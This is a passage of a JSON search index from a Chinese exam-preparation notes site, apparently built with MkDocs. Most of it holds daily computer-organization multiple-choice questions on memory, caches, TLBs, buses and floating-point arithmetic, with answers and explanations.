\u6743\u5229\u4e0e\u4e49\u52a1"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/3.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%89%E5%AD%A3/#2","text":"","title":"2. \u7b2c\u56db\u5468"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/3.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%89%E5%AD%A3/#21","text":"\u6218\u7565\u76ee\u6807\u3001\u5173\u952e\u4e00\u6b65\uff1a\u5168\u9762\u5efa\u6210\u5c0f\u5eb7\u793e\u4f1a \u6218\u7565\u4e3e\u63aa\uff1a\u5168\u9762\u6df1\u5316\u6539\u9769\uff0c\u5168\u9762\u4f9d\u6cd5\u6cbb\u56fd\uff0c\u5168\u9762\u4ece\u4e25\u6cbb\u515a \u5173\u952e\u4e00\u62db\uff1a\u5168\u9762\u6df1\u5316\u6539\u9769 \u4e0e\u5168\u9762\u6df1\u5316\u6539\u9769\u5e76\u79f0\u8f66\u4e4b\u53cc\u8f6e\uff0c\u9e1f\u4e4b\u53cc\u7ffc\uff1a\u5168\u9762\u4f9d\u6cd5\u6cbb\u56fd \u4f1f\u5927\u590d\u5174\u7684\u6839\u672c\u4fdd\u8bc1\uff1a\u5168\u9762\u4ece\u4e25\u6cbb\u515a","title":"2.1. \u56db\u4e2a\u5168\u9762"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/","text":"\u8ba1\u7b97\u673a\u7ec4\u6210\u6bcf\u65e5\u4e00\u9898 2020 August # \u76ee\u5f55 # \u8ba1\u7b97\u673a\u7ec4\u6210\u6bcf\u65e5\u4e00\u9898 2020 August \u76ee\u5f55 1. Week 1 1.1. Mon 1.2. Tue 1.3. Wed 1.4. Thu 1.5. Fri 2. Week 2 2.1. Sat 2.2. Sun 3. Week 3 3.1. Mon 3.2. Tue 3.3. Wed 3.4. Thu 4. Week 4 4.1. Tue 1. Week 1 # 1.1. Mon # \u4e0b\u5217\u8bf4\u6cd5\u6b63\u786e\u7684\u662f \u3002 [\u56fd\u9632\u79d1\u6280\u5927\u5b66] \u2160\uff0e\u5728\u5fae\u578b\u8ba1\u7b97\u673a\u7684\u5e7f\u6cdb\u5e94\u7528\u4e2d\uff0c\u4f1a\u8ba1\u7535\u7b97\u5316\u5c5e\u4e8e\u79d1\u5b66\u8ba1\u7b97\u65b9\u9762\u7684\u5e94\u7528 \u2161\uff0e\u51b3\u5b9a\u8ba1\u7b97\u673a\u8ba1\u7b97\u7cbe\u5ea6\u7684\u4e3b\u8981\u6280\u672f\u662f\u8ba1\u7b97\u673a\u7684\u5b57\u957f \u2162\uff0e\u8ba1\u7b97\u673a\u201c\u8fd0\u7b97\u901f\u5ea6\u201d\u6307\u6807\u7684\u542b\u4e49\u662f\u6bcf\u79d2\u949f\u80fd\u6267\u884c\u591a\u5c11\u6761\u64cd\u4f5c\u7cfb\u7edf\u7684\u547d\u4ee4 \u2163\uff0e\u5229\u7528\u5927\u89c4\u6a21\u96c6\u6210\u7535\u8def\u6280\u672f\u628a\u8ba1\u7b97\u673a\u7684\u8fd0\u7b97\u90e8\u4ef6\u548c\u63a7\u5236\u90e8\u4ef6\u505a\u5728\u4e00\u5757\u96c6\u6210\u7535\u8def\u82af\u7247\u4e0a\uff0c\u8fd9\u6837\u7684\u4e00\u5757\u82af\u7247\u53eb\u5355\u7247\u673a A\uff0e\u2160\u3001\u2162 B\uff0e\u2161\u3001\u2163 C\uff0e\u2161 D\uff0e\u2160\u3001\u2162\u3001\u2163 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u4f1a\u8ba1\u7535\u7b97\u5316\u5c5e\u4e8e\u8ba1\u7b97\u673a\u6570\u636e\u5904\u7406\u65b9\u9762\u7684\u5e94\u7528\uff0c\u2160 \u9519\u8bef\u3002\u2161 \u663e\u7136\u6b63\u786e\u3002\u8ba1\u7b97\u673a\u201c\u8fd0\u7b97\u901f\u5ea6\u201d\u6307\u6807\u7684\u542b \u4e49\u662f\u6bcf\u79d2\u949f\u80fd\u6267\u884c\u591a\u5c11\u6761\u6307\u4ee4\uff0c\u2162 \u9519\u8bef\u3002\u5229\u7528\u5927\u89c4\u6a21\u96c6\u6210\u7535\u8def\u6280\u672f\u628a\u8ba1\u7b97\u673a\u7684\u8fd0\u7b97\u90e8\u4ef6\u548c\u63a7\u5236\u90e8\u4ef6\u505a\u5728\u4e00\u5757\u96c6\u6210 \u7535\u8def\u82af\u7247\u4e0a\uff0c\u8fd9\u6837\u96c6\u6210\u7684\u82af\u7247\u79f0\u4e3aCPU\uff0c\u2163\u9519\u8bef\u3002 1.2. Tue # \u67d0DRAM \u82af\u7247\u5185\u90e8\u5b58\u50a8\u5143\u6392\u5217\u62101024\u00d71024 \u7684\u77e9\u9635\uff0c\u4e14\u5df2\u77e5\u5176\u5b58\u53d6\u5468\u671f\u4e3a0.1\u03bcs\uff0c\u6700\u5927\u5237\u65b0\u95f4\u9694\u4e3a2ms\u3002\u5f53\u91c7\u7528\u5f02\u6b65\u5237\u65b0\u65b9\u5f0f\u65f6\uff0c\u6b7b\u65f6\u95f4 [\u5317\u4eac\u79d1\u6280\u5927\u5b66] A\uff0e\uff1d2ms B\uff0e\u2248 0.1ms C\uff0e\uff1d0.2\u03bcs D\uff0e\uff1d0.1\u03bcs \u7b54\u6848 \u7b54\u7591\uff1aD \u89e3\u6790\uff1a\u5f53\u91c7\u7528\u5f02\u6b65\u5237\u65b0\u65b9\u5f0f\u65f6\uff0c\u5c06\u5bf9DRAM \u82af\u7247\u51851024 \u884c\u7684\u5237\u65b0\u5747\u5300\u5206\u5e03\u57282ms \u5185\u7684\u4e0d\u540c\u65f6\u95f4\uff0c\u6bcf\u6b21 \u5237\u65b0\u4e00\u884c\uff1b\u8fd9\u6837\u6bcf\u6b21\u5237\u65b0\u53ea\u9700\u505c\u6b62\u4e00\u4e2a\u5b58\u53d6\u5468\u671f\uff0c\u5373\u201c\u6b7b\u65f6\u95f4\u201d\u4e3a\u4e00\u4e2a\u5b58\u53d6\u5468\u671f0.1\u03bcs\uff0c\u56e0\u6b64\u7b54\u6848\u9009D\u3002 1.3. Wed # \u7528\u4e8e\u79d1\u5b66\u8ba1\u7b97\u7684\u8ba1\u7b97\u673a\u4e2d\uff0c\u6807\u5fd7\u7cfb\u7edf\u6027\u80fd\u7684\u4e3b\u8981\u53c2\u6570\u662f \u3002[\u5317\u4eac\u79d1\u6280\u5927\u5b66] A\uff0e\u4e3b\u65f6\u949f\u9891\u7387 B\uff0e\u4e3b\u5b58\u5bb9\u91cf C\uff0eMFLOPS D\uff0eMIPS \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1aAB \u4e24\u9879\uff0c\u6240\u6307\u53c2\u6570\u8d8a\u5927\u8d8a\u6709\u5229\u4e8e\u63d0\u9ad8\u7cfb\u7edf\u6027\u80fd\uff0c\u4f46\u662f\u5e76\u4e0d\u662f\u6807\u5fd7\u6027\u80fd\u7684\u4e3b\u8981\u53c2\u6570\uff0c\u4e0d\u540c\u9891\u7387\u6216\u8005 \u4e3b\u5b58\u5bb9\u91cf\u7684\u8ba1\u7b97\u673a\u5982\u679c\u8fd0\u884c\u4e0d\u540c\u7684\u7a0b\u5e8f\uff0c\u5f97\u5230\u7684\u6027\u80fd\u5e76\u4e0d\u4e00\u5b9a\u662f\u9ad8\u9891\u7387\u6216\u5927\u4e3b\u5b58\u7684\u5c31\u4e00\u5b9a\u597d\u3002D \u9879\uff0cMIPS \u662f\u6bcf \u79d2\u6267\u884c\u767e\u4e07\u6761\u6307\u4ee4\u6761\u6570\uff0c\u662f\u7528\u6765\u63cf\u8ff0\u4e00\u822c\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6027\u80fd\u7684\u3002MFLOPS\uff08\u6bcf\u79d2\u6267\u884c\u767e\u4e07\u6761\u6d6e\u70b9\u6307\u4ee4\u6761\u6570\uff09\u7528\u6765 \u63cf\u8ff0\u8ba1\u7b97\u673a\u6d6e\u70b9\u6027\u80fd\uff0c\u800c\u7528\u4e8e\u79d1\u5b66\u8ba1\u7b97\u7684\u8ba1\u7b97\u673a\u4e3b\u8981\u5c31\u662f\u770b\u6d6e\u70b9\u7684\u6027\u80fd\u3002 1.4. Thu # \u67d0\u673a\u5668\u91c7\u7528\u56db\u4f53\u4f4e\u4f4d\u4ea4\u53c9\u5b58\u50a8\u5668\uff0c \u73b0\u5206\u522b\u6267\u884c\u4e0b\u8ff0\u64cd\u4f5c\uff1a \uff081\uff09\u8bfb\u53d66 \u4e2a\u8fde\u7eed\u5730\u5740\u5355\u5143\u4e2d\u5b58\u653e\u7684\u5b58\u50a8\u5b57\uff0c \u91cd\u590d80 \u6b21\uff1b \uff082\uff09\u8bfb\u53d68 \u4e2a\u8fde\u7eed\u5730\u5740\u5355\u5143\u4e2d\u5b58\u653e\u7684\u5b58\u50a8\u5b57\uff0c\u91cd\u590d60 \u6b21\u3002 \u5219\uff081\uff09\u3001\uff082\uff09\u6240\u82b1\u65f6\u95f4\u4e4b\u6bd4\u4e3a \u3002[\u5317\u4eac\u79d1\u6280\u5927\u5b66] A\uff0e1:1 B\uff0e2:1 C\uff0e4:3 D\uff0e3:4 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u5047\u8bbe\u5b58\u50a8\u5668\u7684\u5b58\u53d6\u5468\u671f\u4e3aT\uff0c\uff081\uff09\u7684\u60c5\u51b5\u4e0b\uff0c\u8fde\u7eed\u8bfb\u53d66 \u4e2a\u5b58\u50a8\u5b57\u9700\u65f6T\uff0b\uff086\uff0d1\uff09\u00d7\uff08T/4\uff09\uff1d2.25T\uff0c\u4f46\u5b58\u653e\u8fde\u7eed\u5b57\u4e2d\u7b2c\u4e00\u4e2a\u5b57\u7684\u5b58\u50a8\u5668\u9700\u52302T \u65f6\u95f4\u540e\u624d\u80fd\u8fdb\u884c\u4e0b\u4e00\u8f6e\u8bfb\u53d6\uff0c\u6545\uff081\uff09\u5171\u9700\u65f62T\u00d7\uff0880\uff0d1\uff09 \uff0b2.25T \uff1d160.25T\uff1b\uff082\uff09\u7684\u60c5\u51b5\u540c\u7406\uff0c\u4e00\u8f6e\u8bfb\u53d6\u9700\u65f6T\uff0b\uff088\uff0d1\uff09\u00d7\uff08T/4 \uff09\uff1d2.75T \uff0c\u4f46\u5f00\u59cb\u4e0b\u4e00\u8f6e\u8bfb\u53d6\u97003T \u65f6 \u95f4\u540e\uff0c\u6545\uff082\uff09\u5171\u9700\u65f62T\u00d7\uff0860\uff0d1\uff09\uff0b 2.75T\uff1d120.75T\uff1b\u7efc\u5408\u4e0a\u8ff0\u5206\u6790\uff0c \uff081\uff09\u3001 \uff082\uff09\u6240\u82b1\u65f6\u95f4\u4e4b\u6bd4\u7ea6\u4e3a4:3\u3002 1.5. Fri # \u67d0\u8ba1\u7b97\u673a\u4e3b\u5b58\u5730\u5740\u7a7a\u95f4\u5927\u5c0f\u4e3a256MB\uff0c\u6309\u5b57\u8282\u7f16\u5740\u3002\u865a\u62df\u5730\u7a7a\u95f4\u5927\u5c0f\u4e3a4GB\uff0c\u91c7\u7528\u9875\u5f0f\u5b58\u50a8\u7ba1\u7406\uff0c\u9875\u9762 \u5927\u5c0f\u4e3a4KB\uff0cTLB\uff08\u5feb\u8868\uff09\u91c7\u7528\u5168\u76f8\u8054\u6620\u5c04\uff0c\u67094 \u4e2a\u9875\u8868\u9879\uff0c\u5185\u5bb9\u5982\u4e0b\u8868\u6240\u793a \u6709\u6548\u4f4d \u6807\u8bb0 \u9875\u6846\u53f7 ... 0 FF180H 0002H C1 1 3FFF1H 0035H C2 0 02FF3H 0351H C3 1 03FFFH 0153H C3 \u5219\u5bf9\u865a\u62df\u5730\u574003FFF180H \u8fdb\u884c\u865a\u5b9e\u5730\u5740\u53d8\u6362\u7684\u7ed3\u679c\u662f \u3002[\u5317\u4eac\u79d1\u6280\u5927\u5b66] A\uff0e0153180H B\uff0e0035180H C\uff0eTLB \u7f3a\u5931 D\uff0e\u7f3a\u9875 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u7531\u4e8e\u4e3b\u5b58\u5730\u5740\u7a7a\u95f4\u6309\u5b57\u8282\u7f16\u5740\uff0c\u9875\u9762\u5927\u5c0f\u4e3a4KB\uff0c\u865a\u62df\u5730\u5740\u4e3a03FF F180H\uff0c\u6240\u4ee5\u9875\u53f7\u4e3a03FFFH\uff0c \u9875\u5185\u5730\u5740\u4e3a180H\uff0c\u6839\u636e\u9898\u76ee\u4e2d\u7ed9\u51fa\u7684\u9875\u8868\u9879\u53ef\u77e5\u9875\u6807\u8bb0\u4e3a03FFFH \u6240\u5bf9\u5e94\u7684\u9875\u6846\u53f7\u4e3a0153H\uff0c\u4e14\u6709\u6548\u4f4d\u4e3a1\uff0c\u5219 \u9875\u6846\u53f7\u4e0e\u9875\u5185\u5730\u5740\u4e4b\u548c\u5373\u4e3a\u7269\u7406\u5730\u5740015 3180H\u3002 2. Week 2 # 2.1. Sat # \u4e0b\u5217\u6709\u5173\u6d6e\u70b9\u6570\u52a0\u51cf\u8fd0\u7b97\u7684\u53d9\u8ff0\u4e2d\uff0c\u6b63\u786e\u7684\u662f [\u71d5\u5c71\u5927\u5b66810] \u2160\uff0e\u5bf9\u9636\u64cd\u4f5c\u4e0d\u4f1a\u5f15\u8d77\u9636\u7801\u4e0a\u6ea2\u6216\u4e0b\u6ea2 \u2161\uff0e\u53f3\u89c4\u548c\u5c3e\u6570\u820d\u5165\u90fd\u53ef\u80fd\u5f15\u8d77\u9636\u7801\u4e0a\u6ea2 \u2162\uff0e\u5de6\u89c4\u65f6\u53ef\u80fd\u5f15\u8d77\u9636\u7801\u4e0b\u6ea2 \u2163\uff0e\u5c3e\u6570\u6ea2\u51fa\u65f6\u7ed3\u679c\u4e0d\u4e00\u5b9a\u6ea2\u51fa A\uff0e\u4ec5\u2161\u3001\u2162 B\uff0e\u4ec5\u2160\u3001\u2161\u3001\u2163 C\uff0e\u4ec5\u2160\u3001\u2162\u3001\u2163 D\uff0e\u2160\u3001\u2161\u3001\u2162\u3001\u2163 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u6d6e\u70b9\u6570\u7684\u52a0\u51cf\u8fd0\u7b97\u6b65\u9aa4\u5305\u62ec\uff1a \u2460\u5bf9\u9636\uff0c\u4f7f\u4e24\u4e2a\u64cd\u4f5c\u6570\u7684\u5c0f\u6570\u70b9\u4f4d\u7f6e\u5bf9\u9f50\uff0c\u9636\u7801\u5c0f\u7684\u5c3e\u6570\u53f3\u79fb\uff0c\u53ef\u80fd \u4ea7\u751f\u6ea2\u51fa\uff0c\u4f46\u662f\u9636\u7801\u4e0d\u4f1a\u6ea2\u51fa\uff1b \u2461\u5c3e\u6570\u6c42\u548c\uff0c\u5c06\u5bf9\u9636\u540e\u7684\u5c3e\u6570\u6309\u5b9a\u70b9\u6570\u52a0(\u51cf\uff09\u8fd0\u7b97\u89c4\u5219\u8fd0\u7b97\uff1b \u2462\u89c4\u683c\u5316\uff0c\u5305\u62ec\u5de6\u89c4\u548c\u53f3\u89c4\uff0c\u5de6\u89c4\u65f6\u9636\u7801\u51cf\u5c11\uff0c\u53ef\u80fd\u51fa\u73b0\u9636\u7801\u4e0b\u6ea2\uff0c\u800c\u53f3\u89c4\u65f6\uff0c\u9636\u7801\u589e\u52a0\u53ef\u80fd\u51fa\u73b0\u9636\u7801\u4e0a\u6ea2\uff1b \u2463\u820d\u5165\uff0c\u8be5\u8fc7\u7a0b\u53ef\u80fd\u9700\u8981\u53f3\u89c4\u8c03\u6574\u56e0\u6b64\u53ef\u80fd\u51fa\u73b0\u9636\u7801\u4e0a\u6ea2\uff1b \u2464\u6ea2\u51fa\u5224\u65ad\uff0c\u6d6e\u70b9\u6570\u7684\u6ea2\u51fa\u4e0e\u5426\u662f\u7531\u9636\u7801\u7684\u7b26\u53f7\u51b3\u5b9a\u7684\uff0c\u800c\u4e0d\u662f\u7531\u5c3e \u6570\u6ea2\u51fa\u5224\u65ad\u7684\uff0c\u56e0\u6b64\u5c3e\u6570\u6ea2\u51fa\u65f6\u7ed3\u679c\u4e0d\u4e00\u5b9a\u6ea2\u51fa\u3002\u56e0\u6b64\u2160\u3001\u2161\u3001\u2162\u3001\u2163\u5747\u6b63\u786e\u3002 2.2. Sun # \u8ba1\u7b97\u673a\u4e2d\u5e38\u91c7\u7528\u4e0b\u5217\u51e0\u79cd\u7f16\u7801\u8868\u793a\u6570\u636e\uff0c\u5176\u4e2d\uff0c\u00b10\u7f16\u7801\u76f8\u540c\u7684\u662f \u3002[\u71d5\u5c71\u5927\u5b66810] \u2160 \u539f\u7801 \u2161 \u53cd\u7801 \u2162 \u8865\u7801 \u2163 \u79fb\u7801 A\uff0e\u2160\u548c\u2162 B\uff0e\u2161\u548c\u2162 C\uff0e\u2162\u548c\u2163 D\uff0e\u2160\u548c\u2163 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u5047\u8bbe\u5b57\u957f\u4e3a8\u4f4d\uff0c[+0]\u539f=00000000\uff0c[-0]\u539f=10000000\uff1b[+0]\u53cd=00000000\uff0c[-0]\u53cd=11111111\uff1b[+0]\u8865=[-0]\u8865=00000000\uff1b[+0]\u79fb=[-0]\u79fb=10000000\u3002 \u5bf9\u4e8e\u771f\u503c0\uff0c\u539f\u7801\u548c\u53cd\u7801\u5404\u6709\u4e24\u79cd\u4e0d\u540c\u7684\u8868\u793a\u5f62\u5f0f\uff0c\u800c\u8865\u7801\u548c\u79fb\u7801\u53ea\u6709\u552f\u4e00\u7684\u4e00\u79cd\u8868\u793a\u5f62\u5f0f\u3002\u6b63\u56e0\u4e3a\u8865\u7801\u548c\u79fb\u78010\u7684\u8868\u793a\u5f62\u5f0f\u552f\u4e00\uff0c\u624d\u4f7f\u5f97\u8865\u7801\u548c\u79fb\u7801\u6bd4\u539f\u7801\u548c\u53cd\u7801\u80fd\u591a\u8868\u793a\u4e00\u4e2a\u8d1f\u6570\u3002 3. Week 3 # 3.1. Mon # \u91c7\u7528\u6307\u4ee4Cache \u4e0e\u6570\u636eCache \u5206\u79bb\u7684\u4e3b\u8981\u76ee\u7684\u662f \u3002[\u71d5\u5c71\u5927\u5b66810] A\uff0e\u51cf\u4f4eCache \u7684\u7f3a\u5931\u635f\u5931 B\uff0e\u63d0\u9ad8Cache \u7684\u547d\u4e2d\u7387 C\uff0e\u51cf\u4f4eCPU \u5e73\u5747\u8bbf\u95ee\u65f6\u95f4 D\uff0e\u51cf\u5c11\u6307\u4ee4\u6d41\u6c34\u7ebf\u8d44\u6e90\u51b2\u7a81 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1aCache\u5206\u4e3a\u4e00\u7ea7L1\u548c\u4e8c\u7ea7L2\u3002L1\u96c6\u6210\u5728CPU\u4e2d\uff0c\u79f0\u4e3a\u7247\u5185Cache\u3002\u5728L1\u4e2d\u8fd8\u5206\u6570\u636eCache\u548c\u6307\u4ee4Cache\u3002\u5206\u522b\u7528\u6765\u5b58\u653e\u6570\u636e\u548c\u6267\u884c\u8fd9\u4e9b\u6570\u636e\u7684\u6307\u4ee4\uff0c\u4e24\u4e2aCache\u53ef\u4ee5\u540c\u65f6\u88abCPU\u8bbf\u95ee\uff0c\u51cf\u5c11\u4e86\u4e89\u7528Cache\u6240\u9020\u6210\u7684\u51b2\u7a81\uff0c\u63d0\u9ad8\u4e86\u5904\u7406\u5668\u6548\u80fd\u3002 3.2. Tue # \u4e0b\u5217\u547d\u4ee4\u7ec4\u5408\u60c5\u51b5\uff0c\u4e00\u6b21\u8bbf\u5b58\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u53ef\u80fd\u53d1\u751f\u7684\u662f [\u71d5\u5c71\u5927\u5b66810] A.TLB\u672a\u547d\u4e2d\uff0cCache\u672a\u547d\u4e2d\uff0cPage\u672a\u547d\u4e2d B.TLB\u672a\u547d\u4e2d\uff0cCache\u547d\u4e2d\uff0cPage\u547d\u4e2d C.TLB\u547d\u4e2d\uff0cCache\u672a\u547d\u4e2d\uff0cPage\u547d\u4e2d D.TLB\u547d\u4e2d\uff0cCache\u547d\u4e2d\uff0cPage\u672a\u547d\u4e2d \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u8003\u70b9\uff1aTLB\uff0cCache\uff0cPage\u7684\u542b\u4e49\u3002 TLB\u5373\u4e3a\u5feb\u8868\uff0c\u5feb\u8868\u53ea\u662f\u6162\u8868(Page)\u7684\u5c0f\u5c0f\u526f\u672c\uff0c\u56e0\u6b64TLB\u547d\u4e2d\uff0c\u5fc5\u7136Page\u4e5f\u547d\u4e2d\uff0c\u800c\u5f53Page\u547d\u4e2d\uff0cTLB\u5219\u672a\u5fc5\u547d\u4e2d\uff0c\u6545D\u4e0d\u53ef\u80fd\u53d1\u751f\uff1b\u800cCache\u7684\u547d\u4e2d\u4e0e\u5426\u4e0eTLB\u3001Page\u7684\u547d\u4e2d\u4e0e\u5426\u5e76\u65e0\u5fc5\u7136\u8054\u7cfb\u3002 3.3. Wed # \u4ee5\u4e0b\u6709\u5173\u603b\u7ebf\u8bf4\u6cd5\u9519\u8bef\u7684\u662f [\u71d5\u5c71\u5927\u5b66810] A\uff0e\u603b\u7ebf\u7ba1\u7406\u4e3b\u8981\u5305\u62ec\u5224\u4f18\u63a7\u5236\u548c\u901a\u4fe1\u63a7\u5236 B\uff0e\u96c6\u4e2d\u5f0f\u603b\u7ebf\u5224\u4f18\u63a7\u5236\u903b\u8f91\u6709\u94fe\u5f0f\u67e5\u8be2\u548c\u8ba1\u6570\u5668\u5b9a\u65f6\u67e5\u8be2\u4e24\u79cd\u65b9\u5f0f C\uff0e\u94fe\u5f0f\u67e5\u8be2\u9700\u8981\u589e\u52a02 \u6839\u63a7\u5236\u7ebf\uff0c\u5176\u4f18\u5148\u7ea7\u8fde\u63a5\u56fa\u5b9a\uff0c\u65e0\u7075\u6d3b\u6027 D\uff0e\u5b9a\u65f6\u67e5\u8be2\u9700\u8981\u589e\u52a0log2N \u6839\u63a7\u5236\u7ebf\uff0c\u5176\u4e2dN \u662f\u6240\u5141\u8bb8\u63a5\u7eb3\u7684\u6700\u5927\u8bbe\u5907\u6570\uff0c\u4f18\u5148\u7ea7\u53ef\u7528\u7a0b\u5e8f\u6539\u53d8\uff0c\u7075\u6d3b \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u96c6\u4e2d\u5f0f\u603b\u7ebf\u5224\u4f18\u63a7\u5236\u903b\u8f91\u6709\u94fe\u5f0f\u67e5\u8be2\u3001\u8ba1\u6570\u5668\u5b9a\u65f6\u67e5\u8be2\u548c\u72ec\u7acb\u8bf7\u6c42\u4e09\u79cd\u65b9\u5f0f\u3002 3.4. Thu # \u67d0\u540c\u6b65\u603b\u7ebf\u7684\u65f6\u949f\u9891\u7387\u4e3a100MHz \uff0c\u5bbd\u5ea6\u4e3a32 \u4f4d\uff0c\u5730\u5740/\u6570\u636e\u7ebf\u590d\u7528\uff0c \u6bcf\u4f20\u8f93\u4e00\u4e2a\u5730\u5740\u6216\u6570\u636e\u5360\u7528\u4e00\u4e2a\u65f6 \u949f\u5468\u671f\u3002\u82e5\u8be5\u603b\u7ebf\u652f\u6301\u7a81\u53d1\uff08\u731d\u53d1\uff09\u4f20\u8f93\u65b9\u5f0f\uff0c\u5219\u4e00\u6b21\u201c\u4e3b\u5b58\u5199\u201d\u603b\u7ebf\u4e8b\u52a1\u4f20\u8f93128 \u4f4d\u6570\u636e\u6240\u9700\u8981\u7684\u65f6\u95f4\u81f3\u5c11\u662f [\u71d5\u5c71\u5927\u5b66810] A\uff0e20ns B\uff0e40ns C\uff0e50ns D\uff0e80ns \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u603b\u7ebf\u7684\u65f6\u949f\u9891\u7387\u4e3a100MHz\uff0c\u5219\u65f6\u949f\u5468\u671f\u4e3a10ns\u3002\u6570\u636e\u662f128 \u4f4d\uff0c\u603b\u7ebf\u5bbd\u5ea6\u662f32 \u4f4d\uff0c\u6240\u4ee5\u9700\u89814 \u4e2a\u65f6\u949f\u5468\u671f\uff0c\u800c\u4f20\u8f93\u5730\u5740\u8fd8\u9700\u8981\u4e00\u4e2a\u5468\u671f\uff0c\u6240\u4ee5\u4f20\u8f93\u4e00\u4e2a128 \u4f4d\u7684\u6570\u636e\u81f3\u5c11\u9700\u89815 \u4e2a\u65f6\u949f\u5468\u671f\uff0c\u6240\u4ee5\u81f3\u5c11\u9700\u898110ns*5 \uff1d50ns\u3002 4. Week 4 # 4.1. Tue # \u6709\u5173\u6307\u4ee4\u548c\u5fae\u6307\u4ee4\u4e4b\u95f4\u5173\u7cfb\u7684\u63cf\u8ff0\u4e2d\uff0c\u4e0b\u5217\u9009\u9879\u6b63\u786e\u7684\u662f [\u56fd\u9632\u79d1\u6280\u5927\u5b66821-2018] A\uff0e\u4e00\u6761\u6307\u4ee4\u7684\u529f\u80fd\u901a\u8fc7\u6267\u884c\u4e00\u6761\u5fae\u6307\u4ee4\u6765\u5b9e\u73b0 B\uff0e\u4e00\u6761\u6307\u4ee4\u7684\u529f\u80fd\u901a\u8fc7\u6267\u884c\u4e00\u4e2a\u5fae\u7a0b\u5e8f\u6765\u5b9e\u73b0 C\uff0e\u4e00\u6761\u5fae\u6307\u4ee4\u7684\u529f\u80fd\u901a\u8fc7\u6267\u884c\u4e00\u6761\u6307\u4ee4\u6765\u5b9e\u73b0 D\uff0e\u4e00\u6761\u5fae\u6307\u4ee4\u7684\u529f\u80fd\u901a\u8fc7\u6267\u884c\u4e00\u4e2a\u5fae\u7a0b\u5e8f\u6765\u5b9e\u73b0 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u5728\u5fae\u7a0b\u5e8f\u63a7\u5236\u7684\u8ba1\u7b97\u673a\u4e2d\uff0c\u5c06\u7531\u540c\u65f6\u53d1\u51fa\u7684\u63a7\u5236\u4fe1\u53f7\u6240\u6267\u884c\u7684\u4e00\u7ec4\u5fae\u64cd\u4f5c\u79f0\u4e3a\u5fae\u6307\u4ee4\uff0c\u6240\u4ee5\u5fae\u6307\u4ee4\u5c31\u662f\u628a\u540c\u65f6\u53d1\u51fa\u7684\u63a7\u5236\u4fe1\u53f7\u7684\u6709\u5173\u4fe1\u606f\u6c47\u96c6\u8d77\u6765\u800c\u5f62\u6210\u7684\u3002\u5c06\u4e00\u6761\u6307\u4ee4\u5206\u6210\u82e5\u5e72\u6761\u5fae\u6307\u4ee4\uff0c\u6309\u6b21\u5e8f\u6267\u884c\u8fd9\u4e9b\u5fae\u6307\u4ee4\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u6307\u4ee4\u7684\u529f\u80fd\u3002 \u82e5\u5e72\u6761\u5fae\u6307\u4ee4\u53ef\u4ee5\u6784\u6210\u4e00\u4e2a\u5fae\u7a0b\u5e8f\uff0c\u800c\u4e00\u4e2a\u5fae\u7a0b\u5e8f\u5c31\u5bf9\u5e94\u4e00\u6761\uff08\u673a\u5668\uff09\u6307\u4ee4\u3002","title":"2020 August"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#2020-august","text":"","title":"\u8ba1\u7b97\u673a\u7ec4\u6210\u6bcf\u65e5\u4e00\u9898 2020 August"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#_1","text":"\u8ba1\u7b97\u673a\u7ec4\u6210\u6bcf\u65e5\u4e00\u9898 2020 August \u76ee\u5f55 1. Week 1 1.1. Mon 1.2. Tue 1.3. Wed 1.4. Thu 1.5. Fri 2. Week 2 2.1. Sat 2.2. Sun 3. Week 3 3.1. Mon 3.2. Tue 3.3. Wed 3.4. Thu 4. Week 4 4.1. Tue","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#1-week-1","text":"","title":"1. Week 